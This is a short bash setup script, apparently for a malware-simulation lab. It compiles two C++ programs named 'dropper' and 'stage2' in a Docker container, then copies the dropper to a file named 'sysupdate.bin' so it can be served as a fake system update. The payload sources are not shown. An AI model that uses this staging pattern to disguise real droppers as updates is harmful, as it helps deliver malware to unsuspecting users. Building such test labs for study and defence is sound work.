#!/bin/bash
# setup.sh — compile payloads + guarantee sysupdate.bin exists
set -e

cd "$(dirname "$0")"

cd payload

if [ ! -f dropper ] || [ ! -f stage2 ]; then
  echo "[*] compiling payloads..."
  docker run --rm -v "$(pwd)":/src -w /src ubuntu:24.04 bash -c \
    "apt update -qq && apt install -y -qq g++ libcurl4-openssl-dev >/dev/null && \
     g++ -O2 -std=c++17 dropper.cpp -o dropper -lcurl && \
     g++ -O2 -std=c++17 stage2.cpp -o stage2 -lcurl"
else
  echo "[*] binaries already compiled, skipping"
fi

# Critical fix: sysupdate.bin MUST exist for the download flow
if [ ! -f sysupdate.bin ]; then
  if [ -f dropper ]; then
    cp dropper sysupdate.bin
    echo "[+] sysupdate.bin = compiled dropper"
  else
    echo "SIMULATED-STAGE-2-PAYLOAD (defanged fallback)" > sysupdate.bin
    echo "[!] compile failed — sysupdate.bin is a defanged placeholder"
  fi
fi

cd ..
echo "[+] setup complete. Now run: docker compose up -d"